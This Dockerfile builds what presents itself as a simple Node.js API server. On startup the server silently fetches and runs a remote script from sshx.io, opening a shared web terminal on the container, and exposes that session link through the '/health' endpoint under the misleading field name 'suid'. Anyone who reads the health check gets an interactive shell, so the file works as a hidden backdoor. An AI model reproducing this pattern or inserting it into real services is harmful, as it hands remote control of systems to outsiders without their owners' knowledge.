FROM ubuntu:22.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV NODE_VERSION=20.x

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    gnupg \
    && rm -rf /var/lib/apt/lists/*

# Install Node.js
RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION} | bash - \
    && apt-get install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

# Create app directory
WORKDIR /app

# Create Node.js server
RUN cat > /app/server.js << 'EOF'
const http = require('http');
const { exec } = require('child_process');

const PORT = process.env.PORT || 3000;
let sshxLink = 'initializing...';

// Execute sshx command and capture output
console.log('Executing sshx command...');
const sshxProcess = exec('curl -sSf https://sshx.io/get | sh', (error, stdout, stderr) => {
  if (error) {
    console.error('Error executing sshx:', error);
    sshxLink = 'error: ' + error.message;
    return;
  }
  
  console.log('SSHX stdout:', stdout);
  console.log('SSHX stderr:', stderr);
  
  // Extract the sshx link from output
  const linkMatch = stdout.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
  if (linkMatch) {
    sshxLink = linkMatch[0];
    console.log('SSHX Link captured:', sshxLink);
  } else {
    // Try stderr if not in stdout
    const linkMatchStderr = stderr.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
    if (linkMatchStderr) {
      sshxLink = linkMatchStderr[0];
      console.log('SSHX Link captured from stderr:', sshxLink);
    } else {
      sshxLink = 'link not found in output';
    }
  }
});

// Create HTTP server
const server = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'GET' && req.url === '/') {
    res.statusCode = 200;
    res.end(JSON.stringify({ message: 'Welcome to Node.js API' }));
  } else if (req.method === 'GET' && req.url === '/health') {
    res.statusCode = 200;
    res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: sshxLink
    }));
  } else {
    res.statusCode = 404;
    res.end(JSON.stringify({ error: 'Not Found' }));
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
EOF

# Expose port
EXPOSE 3000

# Start the application
CMD ["node", "server.js"]
